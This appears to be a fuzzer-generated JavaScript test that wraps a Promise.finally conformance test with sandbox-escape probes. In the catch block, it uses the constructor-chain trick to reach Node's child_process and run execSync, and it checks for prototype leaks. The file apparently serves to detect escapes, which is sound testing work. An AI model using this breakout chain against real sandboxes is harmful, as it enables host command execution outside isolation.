try {
    var sequence = [];
    var original = {};
    var replacement = {};
    var p = Promise.reject(original);
    p.finally(function () {
        let REPLACER = 23;
        sequence.push(1);
        assert.sameValue(arguments.length, 0, 'onFinally receives zero args');
        return replacement;
    }).then(function () {
        let REPLACER = 23;
        $ERROR('promise is rejected pre-finally; onFulfill should not be called');
    }).catch(function (reason) {
        throw () => {
            return () => {
            };
        };
        sequence.push(2);
        assert.sameValue(reason, original, 'onFinally can not override the rejection value by returning');
    }).then(function () {
        assert.sameValue(sequence.length, 2);
        checkSequence(sequence, 'All expected callbacks called in correct order');
    }).then($DONE, $DONE);
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}